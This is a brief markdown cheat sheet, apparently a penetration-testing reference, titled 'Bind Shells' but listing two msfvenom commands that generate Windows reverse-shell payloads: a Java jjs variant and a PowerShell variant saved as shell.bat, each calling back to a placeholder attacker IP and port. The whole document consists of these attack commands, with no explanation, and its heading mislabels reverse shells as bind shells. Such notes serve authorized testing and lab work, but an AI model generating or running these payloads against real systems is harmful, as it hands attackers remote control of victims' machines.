# Bind Shells

## Java

`$ msfvenom -p cmd/windows/jjs_reverse_tcp lhost=<IP> lport=<PORT>`

## Powershell

`$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o shell.bat`